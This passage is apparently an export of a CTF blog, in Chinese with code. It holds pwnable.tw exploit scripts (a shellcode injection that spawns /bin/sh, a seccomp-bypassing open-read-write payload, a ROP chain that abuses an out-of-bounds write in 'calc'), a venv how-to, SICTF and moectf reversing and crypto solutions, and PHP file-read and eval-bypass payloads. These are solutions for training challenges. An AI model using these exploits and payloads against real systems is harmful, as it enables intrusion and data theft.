p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda : p.recvline()ru = lambda x: p.recvuntil(x)# g(p)payload = b'a' * 0x14 + p32(0x08048087)sa(&quot;Let's start the CTF:&quot;,payload)leak_rsp = u32(p.recv(4))success(hex(leak_rsp))shellcode = asm('''push %spush %spush esppop ebxxor ecx,ecxxor edx,edxpush 0xbpop eaxint 0x80''' % (u32('/sh\\0') , u32('/bin')))# g(p)payload = b'a' * 0x14 + p32(leak_rsp + 0x14) + shellcodes(payload)p.interactive() orw程序逻辑是，输入 0xC8 个字节的数据，然后call这个数据 12345678910111213141516171819202122232425262728293031323334353637383940; Attributes: bp-based frame fuzzy-sp; int __cdecl main(int argc, const char **argv, const char **envp)public mainmain proc nearvar_4= dword ptr -4argc= dword ptr 8argv= dword ptr 0Chenvp= dword ptr 10h; __unwind {lea ecx, [esp+4]and esp, 0FFFFFFF0hpush dword ptr [ecx-4]push ebpmov ebp, esppush ecxsub esp, 4call orw_seccompsub esp, 0Chpush offset format ; &quot;Give my your shellcode:&quot;call _printfadd esp, 10hsub esp, 4push 0C8h ; nbytespush offset shellcode ; bufpush 0 ; fdcall _readadd esp, 10hmov eax, offset shellcodecall eax ; shellcodemov eax, 0mov ecx, [ebp+var_4]leavelea esp, [ecx-4]retn; } // starts at 8048548main endp 输入前有一个沙箱，可以通过orw(open read write)把flag读出来，不过这里 如果 A 为 64位的话，似乎也能绕过沙箱，好像可以通过retn去修改段寄存器的某个数据来切换处理器的运行模式，不过我是直接用shellcraft来生成orw把flag读出来的 123456789101112131415lhj@lhj-virtual-machine:~/Desktop/pwntw/orw$ seccomp-tools dump ./orw line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0x40000003 if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x07 0x00 0x000000ad if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077 if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001 if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005 if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003 if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004 if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026 return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *# from LibcSearcher import *context(os='linux',arch='i386',log_level='debug')elf = context.binary = ELF('./orw')libc = elf.libcis_debug = 0if(is_debug): p = process()else: ip = &quot;chall.pwnable.tw&quot; port = 10001 p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda : p.recvline()ru = lambda x: p.recvuntil(x)def orw_i386(): shellcode = shellcraft.open('/home/orw/flag') shellcode += shellcraft.read('eax','esp',0x30) shellcode += shellcraft.write(1,'esp',0x30) return asm(shellcode)def orw_cat_i386(): shellcode = shellcraft.i386.linux.cat2('/home/orw/flag') return asm(shellcode)shellcode = orw_cat_i386()print(len(shellcode))# g(p)s(shellcode)p.interactive() calc先分析一下程序的功能，get_expr是输入(最多位1024字节的数据)，parse_expr会把输入的表达式计算出来，最后打印结果。bzero和init_pool这两个函数不太重要，只是初始化的函数 123456789101112131415161718192021unsigned int calc(){ int pool[101]; // [esp+18h] [ebp-5A0h] BYREF char s[1024]; // [esp+1ACh] [ebp-40Ch] BYREF unsigned int v3; // [esp+5ACh] [ebp-Ch] v3 = __readgsdword(0x14u); while ( 1 ) { bzero(s, 0x400u); if ( !get_expr(s, 1024) ) break; init_pool(pool); if ( parse_expr((int)s, pool) ) { printf(&quot;%d\\n&quot;, pool[pool[0]]); fflush(stdout); } } return __readgsdword(0x14u) ^ v3;} 这里对输入有一些字符限制，满足约束才能把数据读进去 123456789101112131415161718int __cdecl get_expr(int a1, int a2){ int v2; // eax char v4; // [esp+1Bh] [ebp-Dh] BYREF int v5; // [esp+1Ch] [ebp-Ch] v5 = 0; while ( v5 &lt; a2 &amp;&amp; read(0, &amp;v4, 1) != -1 &amp;&amp; v4 != 10 ) { if ( v4 == 43 || v4 == 45 || v4 == 42 || v4 == 47 || v4 == 37 || v4 &gt; 47 &amp;&amp; v4 &lt;= 57 ) { v2 = v5++; *(_BYTE *)(a1 + v2) = v4; } } *(_BYTE *)(v5 + a1) = 0; return v5;} 12[37, 42, 43, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57]%*+-/0123456789 parse_expr中，会通过查找运算符位置的方式，来划分表达式中的操作数 运算符，分别存储到两个数组中，最后丢到eval里计算结果 满足约束的运算符的ascii是 &lt; 48的，这里做了一个无符号的类型转换 负数转u32_int的值是 &gt; 9的，所以这段代码作用是 判断是否是一个运算符(第一次看感觉很奇怪) 1(unsigned int)(*(char *)(i + inputString) - 48) &gt; 9 ) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677int __cdecl parse_expr(int inputString, _DWORD *pool){ int v3; // eax int v4; // [esp+20h] [ebp-88h] int i; // [esp+24h] [ebp-84h] int v6; // [esp+28h] [ebp-80h] int v7; // [esp+2Ch] [ebp-7Ch] char *s1; // [esp+30h] [ebp-78h] int v9; // [esp+34h] [ebp-74h] char operator[100]; // [esp+38h] [ebp-70h] BYREF unsigned int v11; // [esp+9Ch] [ebp-Ch] v11 = __readgsdword(0x14u); v4 = inputString; v6 = 0; bzero(operator, 0x64u); for ( i = 0; ; ++i ) { if ( (unsigned int)(*(char *)(i + inputString) - 48) &gt; 9 ) { v7 = i + inputString - v4; s1 = (char *)malloc(v7 + 1); memcpy(s1, v4, v7); s1[v7] = 0; if ( !strcmp(s1, &quot;0&quot;) ) { puts(&quot;prevent division by zero&quot;); fflush(stdout); return 0; } v9 = atoi(s1); if ( v9 &gt; 0 ) { v3 = (*pool)++; pool[v3 + 1] = v9; } if ( *(_BYTE *)(i + inputString) &amp;&amp; (unsigned int)(*(char *)(i + 1 + inputString) - 48) &gt; 9 ) { puts(&quot;expression error!&quot;); fflush(stdout); return 0; } v4 = i + 1 + inputString; if ( operator[v6] ) { switch ( *(_BYTE *)(i + inputString) ) { case '%': case '*': case '/': if ( operator[v6] != 43 &amp;&amp; operator[v6] != 45 ) goto LABEL_14; operator[++v6] = *(_BYTE *)(i + inputString); break; case '+': case '-':LABEL_14: eval(pool, operator[v6]); operator[v6] = *(_BYTE *)(i + inputString); break; default: eval(pool, operator[v6--]); break; } } else { operator[v6] = *(_BYTE *)(i + inputString); } if ( !*(_BYTE *)(i + inputString) ) break; } } while ( v6 &gt;= 0 ) eval(pool, operator[v6--]); return 1;} 漏洞点出来eval函数中，从这里可以发现 pool[0]是存储pool中有多少个操作数，通过pool[0] 计算下标取两个操作数的位置，还有计算结果存放的位置。 如果表达式为 + 10的话，这个表达式会变成 pool[1 - 1] += pool[1]，也就是能覆盖pool[0]。由于eval计算表达式是通过pool[0]来计算存储结果的位置，也就是说能控制pool[0] 就能往任意地址写入 表达式的结果，实现一个任意地址值写 1pool[*pool - 1] += pool[*pool]; 123456789101112131415161718192021222324252627_DWORD *__cdecl eval(_DWORD *pool, char a2){ _DWORD *result; // eax if ( a2 == 43 ) { pool[*pool - 1] += pool[*pool]; } else if ( a2 &gt; 43 ) { if ( a2 == 45 ) { pool[*pool - 1] -= pool[*pool]; } else if ( a2 == 47 ) { pool[*pool - 1] /= (int)pool[*pool]; } } else if ( a2 == 42 ) { pool[*pool - 1] *= pool[*pool]; } result = pool; --*pool; return result;} 除了任意地址写外，printf这里是通过 pool作为基地址，偏移pool[0]来取数据打印的，这意味着这里能泄露任意地址 12345if ( parse_expr((int)s, pool) ){ printf(&quot;%d\\n&quot;, pool[pool[0]]); fflush(stdout);} 利用思路是，通过ropgadget生成一个rop链，往返回地址写这个rop链，先泄露要写的位置的数据，然后通过sub和add清空这个位置的数据，最后把rop链 add上去。 这个pool距离 rbp的位置是 0x5a0个字节，32位程序返回地址在rbp + 4上。pool是int32类型的，所以偏移为 (0x5a0 + 4) / 4 = 361 1int pool[101]; // [esp+18h] [ebp-5A0h] BYREF 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from pwn import *from LibcSearcher import *context(os='linux',arch='i386',log_level='debug')elf = context.binary = ELF('./calc')libc = elf.libcis_debug = 0if(is_debug): p = process()else: ip = &quot;chall.pwnable.tw&quot; port = 10100 p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x=None: p.recv() if x is None else p.recv(x)rl = lambda : p.recvline()ru = lambda x: p.recvuntil(x)r_leek_libc_64 = lambda : u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))r_leek_libc_32 = lambda : u32(p.recvuntil(b'\\xf7')[-4:])from struct import packpayload = b''payload += pack('&lt;I', 0x080701aa) # pop edx ; retpayload += pack('&lt;I', 0x080ec060) # @ .datapayload += pack('&lt;I', 0x0805c34b) # pop eax ; retpayload += b'/bin'payload += pack('&lt;I', 0x0809b30d) # mov dword ptr [edx], eax ; retpayload += pack('&lt;I', 0x080701aa) # pop edx ; retpayload += pack('&lt;I', 0x080ec064) # @ .data + 4payload += pack('&lt;I', 0x0805c34b) # pop eax ; retpayload += b'//sh'payload += pack('&lt;I', 0x0809b30d) # mov dword ptr [edx], eax ; retpayload += pack('&lt;I', 0x080701aa) # pop edx ; retpayload += pack('&lt;I', 0x080ec068) # @ .data + 8payload += pack('&lt;I', 0x080550d0) # xor eax, eax ; retpayload += pack('&lt;I', 0x0809b30d) # mov dword ptr [edx], eax ; retpayload += pack('&lt;I', 0x080481d1) # pop ebx ; retpayload += pack('&lt;I', 0x080ec060) # @ .datapayload += pack('&lt;I', 0x080701d1) # pop ecx ; pop ebx ; retpayload += pack('&lt;I', 0x080ec068) # @ .data + 8payload += pack('&lt;I', 0x080ec060) # padding without overwrite ebxpayload += pack('&lt;I', 0x080701aa) # pop edx ; retpayload += pack('&lt;I', 0x080ec068) # @ .data + 8payload += pack('&lt;I', 0x080550d0) # xor eax, eax ; retpayload += pack('&lt;I', 0x0807cb7f) # inc eax ; retpayload += pack('&lt;I', 0x0807cb7f) # inc eax ; retpayload += pack('&lt;I', 0x0807cb7f) # inc eax ; retpayload += pack('&lt;I', 0x0807cb7f) # inc eax ; retpayload += pack('&lt;I', 0x0807cb7f) # inc eax ; retpayload += pack('&lt;I', 0x0807cb7f) # inc eax ; retpayload += pack('&lt;I', 0x0807cb7f) # inc eax ; retpayload += pack('&lt;I', 0x0807cb7f) # inc eax ; retpayload += pack('&lt;I', 0x0807cb7f) # inc eax ; retpayload += pack('&lt;I', 0x0807cb7f) # inc eax ; retpayload += pack('&lt;I', 0x0807cb7f) # inc eax ; retpayload += pack('&lt;I', 0x08049a21) # int 0x80r()for i in range(361, 361 + int(len(payload) / 4)): sl('+' + str(i)) value = int(r()) if value &gt; 0: payload2 = f'+{i}-{value}+{u32(payload[(i - 361) * 4:(i - 361 + 1) * 4])}' else: payload2 = f'+{i}+{-value}+{u32(payload[(i - 361) * 4:(i - 361 + 1) * 4])}' sl(payload2) r()sl('')p.interactive()","link":"/2023/12/28/pwnable-tw/"},{"title":"python3-venv虚拟环境使用-解决包管理版本控制混乱的问题","text":"安装1sudo apt install python3-venv 创建虚拟环境1python3 -m venv test_env 会自动在用户目录创建一个test _env的虚拟环境目录 开启&amp;使用虚拟环境1source ~/test_env/bin/activate 开启虚拟环境后pip install安装的包会自动存放在/test_env/lib/pythonx.x/site-packages目录下面 关闭虚拟环境1deactivate","link":"/2023/09/18/python3-venv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8-%E8%A7%A3%E5%86%B3%E5%8C%85%E7%AE%A1%E7%90%86%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E6%B7%B7%E4%B9%B1%E7%9A%84%E9%97%AE%E9%A2%98/"},{"title":"sictf2023","text":"附件 https://github.com/nyyyddddn/ctf/tree/main/Sictf2023%20%23Round%202Reverse[签到]PYC电脑上的pycdc出问题了，就找个在线的 https://www.lddgo.net/string/pyc-compile-decompile print(‘SICTF{07e278e7-9d66-4d90-88fc-8bd61e490616}’) Myobjectrc4加解密，写个脚本 123456789101112131415161718192021222324252627def rc4(key, plaintext): S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256 S[i], S[j] = S[j], S[i] # Swap values i = 0 j = 0 output = [] for byte in plaintext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] K = S[(S[i] + S[j]) % 256] output.append(byte ^ K) return outputkey = [ord(char) for char in &quot;SIFLAG&quot;]v18_bytes = (0x47CF225A0ED32730).to_bytes(8, byteorder='little')ciphertext_v19 = [71, 107, 11, 229, 141, 83, 186, 153, 195, 133, 7]v20_bytes = (0x9F88FE10771C0107).to_bytes(8, byteorder='little')full_ciphertext_27 = list(v18_bytes) + ciphertext_v19 + list(v20_bytes)decrypted_full_combined = rc4(key, full_ciphertext_27)decrypted_full_combined_string = ''.join([chr(byte) for byte in decrypted_full_combined])print(decrypted_full_combined_string) SICTF{wow_you_get_the_flag} chbase12345678910111213strcpy(Str2, &quot;F0lWEVA7BmUzAGB0C2UuAU9hbnIpATEidDdnACQ9&quot;);char *sub_411B30(){ char *result; // eax __CheckForDebuggerJustMyCode(&amp;unk_41C0F5); j_strcpy(&amp;Destination, &quot;ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz0123456789+/&quot;); result = (char *)IsDebuggerPresent(); if ( result ) return j_strcpy(&amp;Destination, &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;); return result;} base64换一下上面的索引表就解出来了 http://web.chacuo.net/netbasex SICTF{base64_and_antidebugger} 不一样的base64这个出题人怎么对base64情有独钟 pyinstaller打包的exe,我找了几个提取pyc的项目，就这个比较好用 https://github.com/pyinstxtractor/pyinstxtractor-ng/releases/tag/2023.08.20 然后把111.pyc 反编译一下 https://www.lddgo.net/string/pyc-compile-decompile 1234567891011121314151617181920212223242526# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information# Version : Python 3.8BASE64_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'def base64_encode(data): binary_str = ''.join((lambda .0: for x in .0:format(x, '08b'))(data)) padding = len(binary_str) % 24 if padding != 0: binary_str += '0' * (24 - padding) result = '' for i in range(0, len(binary_str), 6): group = binary_str[i:i + 6] decimal_val = int(group, 2) result += BASE64_CHARS[decimal_val] padding_count = (4 - len(result) % 4) % 4 result += '=' * padding_count return resultdata = input('').encode()encoded_data = base64_encode(data)print(encoded_data)if encoded_data == 'U0lDVEZ7OGUwZDM1OGQtOGI5ZC00ODY2LTliMDItNjc0OWIwN2FkMDlhfQAA': print('True!') 这个是base64换表，用这个解密 http://web.chacuo.net/netbasex SICTF{8e0d358d-8b9d-4866-9b02-6749b07ad09a}拿到flag javacodeCrypto[签到]古典大杂烩emjoy编码，用这个解码http://www.atoolbox.net/Tool.php?Id=937 然后就不知道什么编码了，在搜索ctf编码识别的时候找到了这个项目 https://github.com/Ciphey/Ciphey 用这个项目解出了flag，这是docker版本的使用https://docs.remnux.org/run-tools-in-containers/remnux-containers#ciphey SICTF{fe853b49-8730-462e-86f5-fc8e9789f077} Radio有三组n c，然后e比较小，用中国剩余定理求 123456789101112131415161718192021222324252627282930313233343536import gmpy2import binascii# 利用中国剩余定理求解同余方程，aList：余数，mList：模数def CRT(aList, mList): M = 1 for i in mList: M = M * i # 计算M = ∏ mi x = 0 for i in range(len(mList)): Mi = M // mList[i] # 计算Mi Mi_inverse = gmpy2.invert(Mi, mList[i]) # 计算Mi的逆元 x += aList[i] * Mi * Mi_inverse # 构造x各项 x = x % M return xif __name__ == &quot;__main__&quot;: n1 = &quot;14628911682936716611458501697007036859460044243525290515096052103585430459755335375005202100114469571371360084664887335211277585652711111523095037589648375630146039444071400098427638768750755153219974194380355807078158427824557754939604018020265955042573660474772006646525311705184431094905718137297923127124517126579859336516891364853724635334011666814712424599592662398013241607855160919361308195967978220182785816761656927836373944699635667244275310680450562446433724968942835275279255823144471582249379035668825437133182865600026935116686574740844588839352146024513673500770611055698030333734066230166111140083923&quot; n2 = &quot;16756694748293603983474688536179571665757862433174984877308316444468003022266277794769268134195205510197588585566270416339902269736376811449830775290335951504698137924773942880807921752691668522662285163130340474205633998154849689387759453003838730282756734975490180702422176361373516245372635401939755527017589503572550811648345570775428936487145892225736625411540461653083957762795820510109891180906709827194217045059033312564525916136573856999724346161896146703174418039344166251503310869772735585554127509732135494936119159784702673291794381095696332128950979288440758815310482211285712819274848744478643590996499&quot; n3 = &quot;12023158079717019193506148537498877243668782424904061914991928068483879707115315968983829360560644394409575645736275352836086080024994045582242629571839276759393418303915955798990522990081795218822313146157773272844272865701134880180795342597049645358985187689813369428579614193015028249821853347208001645148169449968882591709833452960545988520048722323580338213590245476892223967673180144525106292453573842357322398199104132677638909964034937501684668442732786408572501007756270725934445316827054687741612177409932320532825182104820899546084015733164816993674100635828218335112393003462442685677115798304835391938681&quot; c1 = &quot;786426913645332991929803636719878643130489430090701482974255190570111407517277263761161970232982615374753982050075781017755721714929721429185828101898786972242994012456972241276851428750970754773002966788642795040933520662931514953660571657013642671173456750800960592586345219252277575624120271330470724245201080094330964145796872211627254805407394764183615099525852600855622089361965086460279057625205099471122036599934609091062009161119885692567925924978687256063116915630947838112126347748759078024890458539541208153526564434483654508834147071166870006117573542198238493913144419569943131642262575848786399020602&quot; c2 = &quot;14269311999815379511888097227418748728398011595172649708273598243317106830139061994801598925448165045032084910971094414749744701731066555194159863759072739031915833091715422787808666326235589236328864675164322734119047182014621724868200908222400504845559290620275973427127376594365043386362821355037781568524903149101953873768462097165128186788759111090267131443645126715520994688945363059795513931799317608292977574376954729552861360597103229877031117089231816770880909815561950691603994439997197261395452797893557057320175747162837857668062550646101714062365530246698404923128445182100334335447738834779014705114350&quot; c3 = &quot;3204718091370324153305164801961074660508922478706979436653573192321723216725523523538914956544950802616295043619768261075799875855502834749045520466140056621489305006966280527055668378303630674311102581232313032585389907028715671091914904062961720585667564982641321454541632782484415075257140508738041786400512095949826279576159569786734978545737717138115729502475357594151593143140355121154223614868465202149338507796306863351134218879326031985027900678671697876083351974546516576983143592764763925335805465720148057651958521255276602933604064541840892578409973858867533575728482926007556060584654853884046046420855&quot; cList = [int(c1), int(c2), int(c3)] nList = [int(n1), int(n2), int(n3)] m_e = CRT(cList, nList) for e in range(17,18): m, f = gmpy2.iroot(m_e, e) m = hex(m)[2:] if len(m) % 2 == 1: m = m + '0' flag = binascii.unhexlify(m) print(flag) SICTF{fdc0afb5-1c81-46b9-a28a-241f5f64419d} small_e123456789101112131415161718from sympy import symbols, Eq, solven = 23407088262641313744603678186127228163189328033499381357614318160776774708961658114505773173784501557046914457908828086210961235530240151825359345210845219656000760996670856300710703016947799649686427460688236465568188205550456293373157997725204643414082796492333552579250010906010553831060540937802882205118399938918764313169385349293602085310111289583058965780887097301702677087443291977479125263301000328313103296364864396361278863921717374909215078711198899810620522933994481419395021233240234478331179727351050575360886334237633420906629984625441302945112631166021776379103081857393866576659121443879590011160797e = 3c = 1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181m1 = 11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592c1 = pow(m1, e, n)delta_m_symbol = symbols('delta_m')polynomial_equation = Eq(c, (m1 + delta_m_symbol)**3)solutions = solve(polynomial_equation, delta_m_symbol)m_recovered = m1 + solutions[0]print(bytes.fromhex(hex(m_recovered)[2:]).decode()) SICTF{2ca8e589-4a31-4909-80f0-9ecfc8f8cb37} Web[签到]Includehttp://210.44.151.51:10120/?SICTF=php://filter/read=convert.base64-encode/resource=flag.php 读到下面内容 12345678&lt;?php$file_path = &quot;/flag&quot;;if (file_exists($file_path)) { $flag = file_get_contents($file_path);}else{ echo &quot;error&quot;;} 访问flag.php没有error，所以用伪协议读/flag 拿到flag http://210.44.151.51:10120/?SICTF=php://filter/read=convert.base64-encode/resource=/flag base64解码SICTF{f9bcd5bf-2e28-404c-936c-92d7f0ba2158} Baby_PHP1234567891011121314151617181920212223highlight_file(__FILE__);error_reporting(0);$query = $_SERVER['QUERY_STRING'];if (preg_match('/_|%5f|\\.|%2E/i', $query)) { die('You are Hacker!');}if($_GET['k_e_y'] !=='123' &amp;&amp; preg_match('/^123$/',$_GET['k_e_y'])){ echo(&quot;You are will Win!&lt;br&gt;&quot;); if(isset($_POST['command'])){ $command = $_POST['command']; if(!preg_match(&quot;/\\~|\\`|\\@|\\#|\\\\$|\\%|\\&amp;|\\*|\\（|\\）|\\-|\\+|\\=|\\{|\\}|\\[|\\]|\\:|\\'|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;,$command)){ eval($command); } else{ echo(&quot;You are Hacker!&quot;); } }}else{ echo(&quot;K_e_y is Errors!&quot;);} 这里第一个preg是可以用url编码代替下划线，然后第二个preg $_GET[key]是强比较加后面的preg_match，搜了好久发现可以用换行符%0A绕过这个k%20e%20y=123%0A command中preg那个这个圆括号是中文的圆括号，也就是说可以用函数，我一开始想着是system()然后去网上找些shell中的一些奇怪的技巧去绕过，然后发现关键的字符基本上都给过滤了，后面想了一下能用函数，那是不是可以用函数来替代原本该用shell操作的动作 在这篇文章里面找到了结果https://blog.csdn.net/qq_38154820/article/details/107171940?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161461040516780255236081%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161461040516780255236081&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-107171940.pc_search_result_no_baidu_js&amp;utm_term=%E6%97%A0%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96 最后的payload是 12?k%20e%20y=123%0Acommand=highlight_file(next(array_reverse(scandir(current(localeconv()))))); MISCfast_morse摩斯密码 1..-. ..--- .- ----- ----. -... ..-. -....- --... ..-. ....- .- -....- ....- ..--- -.... ----. -....- ----. ...-- .- ..... -....- -.-. ---.. .- ....- ---.. ...-- -.... ----- -... ----- ...-- -.-. 1SICTF{f2a09bf-7f4a-4269-93a5-c8a48360b03c}","link":"/2023/09/18/sictf2023r2/"},{"title":"moectf_wp","text":"REReverse入门指北12if ( *(_DWORD *)v7 == 13 ) sub_401082(aMoectfF1rstSt3, v6); 1aMoectfF1rstSt3 db 'moectf{F1rst_St3p_1s_D0ne}',0Ah,0 base_64pycdc 下载 编译 发现是base64变种 http://web.chacuo.net/netbasex 把索引表复制进去解密拿到flag UPX!exeinfope中看到是upx 3.9 脱壳后 12345678910111213for ( j = 0; ; ++j ) { v8 = j; v2 = sub_140073829((__int64)inputString); if ( v8 &gt;= v2 ) break; inputString[j] ^= 0x67u; if ( flag[j] != inputString[j] ) { sub_140073973((__int64)&quot;try again~~&quot;); sub_1400723F7(0i64); } } 在这里可以得出只需要将flag全部数据异或上0x67u转ascii码就能拿到flag 12345678910data = [ 0x0A, 0x08, 0x02, 0x04, 0x13, 0x01, 0x1C, 0x57, 0x0F, 0x38, 0x1E, 0x57, 0x12, 0x38, 0x2C, 0x09, 0x57, 0x10, 0x38, 0x2F, 0x57, 0x10, 0x38, 0x13, 0x08, 0x38, 0x35, 0x02, 0x11, 0x54, 0x15, 0x14, 0x02, 0x38, 0x32, 0x37, 0x3F] + [0x46, 0x46, 0x46] + [0x1A] + [0x00] * 0x17xor_result = [byte ^ 0x67 for byte in data]ascii_output = ''.join([chr(byte) for byte in xor_result])print(ascii_output) Xor123456789data = [ 0x54,0x56,0x5C,0x5A,0x4D,0x5F,0x42, 0x60,0x56,0x4C,0x66,0x52,0x57,0x9,0x4E,0x66,0x51, 0x9,0x4E,0x66,0x4D,0x9 ,0x66,0x61,0x9,0x6B,0x18,0x44 ]xor_result = [byte ^ 0x39 for byte in data]ascii_output = ''.join([chr(byte) for byte in xor_result])print(ascii_output) ANDROID根据hint1 搜索到button的id 搜到r.id.check找到关键代码 123456789101112131415161718192021222324252627282930public class MainActivity extends AppCompatActivity { char[] enc = {25, 7, 0, 14, 27, 3, 16, '/', 24, 2, '\\t', ':', 4, 1, ':', '*', 11, 29, 6, 7, '\\f', '\\t', '0', 'T', 24, ':', 28, 21, 27, 28, 16}; char[] key = {'t', 'h', 'e', 'm', 'o', 'e', 'k', 'e', 'y'}; /* JADX INFO: Access modifiers changed from: protected */ @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_main); final EditText editText = (EditText) findViewById(R.id.input); ((Button) findViewById(R.id.check)).setOnClickListener(new View.OnClickListener() { // from class: com.doctor3.basicandroid.MainActivity.1 @Override // android.view.View.OnClickListener public void onClick(View view) { String obj = editText.getText().toString(); if (obj.length() != 31) { Toast.makeText(MainActivity.this.getApplicationContext(), &quot;长度不对哦&quot;, 0).show(); return; } byte[] bytes = obj.getBytes(); for (int i = 0; i &lt; 31; i++) { if ((bytes[i] ^ MainActivity.this.key[i % MainActivity.this.key.length]) != MainActivity.this.enc[i]) { Toast.makeText(MainActivity.this.getApplicationContext(), &quot;好像有哪里不对&quot;, 0).show(); return; } } Toast.makeText(MainActivity.this.getApplicationContext(), &quot;恭喜！回答正确&quot;, 0).show(); } }); }} 1((bytes[i] ^ MainActivity.this.key[i % MainActivity.this.key.length]) != MainActivity.this.enc[i]) 这里就可以得出只要将enc ^ MainActivity.this.key[i % MainActivity.this.key.length])就可以得到bytes 上面得知bytes的长度为31 123456789101112131415161718import reimport stringenc = [25, 7, 0, 14, 27, 3, 16, '/', 24, 2, '\\t', ':', 4, 1, ':', '*', 11, 29, 6, 7, '\\f', '\\t', '0', 'T', 24, ':', 28, 21, 27, 28, 16]key = ['t', 'h', 'e', 'm', 'o', 'e', 'k', 'e', 'y']for i in range(31): if isinstance(enc[i], int): enc[i] = enc[i] ^ ord(key[i % len(key)]) else: enc[i] = ord(enc[i]) ^ ord(key[i % len(key)])for i in range(31): print(chr(enc[i]), end=&quot;&quot;) EQUATION使运算全部为假就行了 把!=改成== 然后丢z3里面跑，scanf是31s，但是ida显示上是最大为24，需要修改一下长度 多行合并一行https://www.lddgo.net/string/line-reduce 一行按分隔符分多行https://www.toolhelper.cn/Char/TextSplit 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from z3 import *s = Solver()v4 = [Int(f'v4[{i}]') for i in range(32)]# for i in range(32):# s.add(v4[i] != 0)# s.add(v4[i] &gt;= 32)# s.add(v4[i] &lt;= 126)s.add(v4[0] == 109) #ms.add(v4[1] == 111) #os.add(v4[2] == 101) #es.add(v4[3] == 99) #cs.add(v4[4] == 116) #ts.add(v4[5] == 102) #fs.add(v4[6] == 123) #{#s.add(334 * v4[28]+ 100 * v4[27]+ 369 * v4[26]+ 124 * v4[25]+ 278 * v4[24]+ 158 * v4[23]+ 162 * v4[22]+ 145 * v4[19]+ 27 * v4[17]+ 91 * v4[15]+ 195 * v4[14]+ 342 * v4[13]+ 391 * v4[10]+ 204 * v4[9]+ 302 * v4[8]+ 153 * v4[7]+ 292 * v4[6]+ 382 * v4[5]+ 221 * v4[4]+ 316 * v4[3]+ 118 * v4[2]+ 295 * v4[1]+ 247 * v4[0]+ 236 * v4[11]+ 27 * v4[12]+ 361 * v4[16]+ 81 * v4[18]+ 105 * v4[20]+ 65 * v4[21]+ 67 * v4[29]+ 41 * v4[30] == 596119)s.add(371 * v4[29]+ 338 * v4[28]+ 269 * v4[27]+ 312 * v4[26]+ 67 * v4[25]+ 299 * v4[24]+ 235 * v4[23]+ 294 * v4[22]+ 303 * v4[21]+ 211 * v4[20]+ 122 * v4[19]+ 333 * v4[18]+ 341 * v4[15]+ 111 * v4[14]+ 253 * v4[13]+ 68 * v4[12]+ 347 * v4[11]+ 44 * v4[10]+ 262 * v4[9]+ 357 * v4[8]+ 323 * v4[5]+ 141 * v4[4]+ 329 * v4[3]+ 378 * v4[2]+ 316 * v4[1]+ 235 * v4[0]+ 59 * v4[6]+ 37 * v4[7]+ 264 * v4[16]+ 73 * v4[17]+ 126 * v4[30] == 634009)s.add(337 * v4[29]+ 338 * v4[28]+ 118 * v4[27]+ 82 * v4[26]+ 239 * v4[21]+ 58 * v4[20]+ 304 * v4[19]+ 330 * v4[18]+ 377 * v4[17]+ 306 * v4[16]+ 221 * v4[13]+ 345 * v4[12]+ 124 * v4[11]+ 272 * v4[10]+ 270 * v4[9]+ 229 * v4[8]+ 377 * 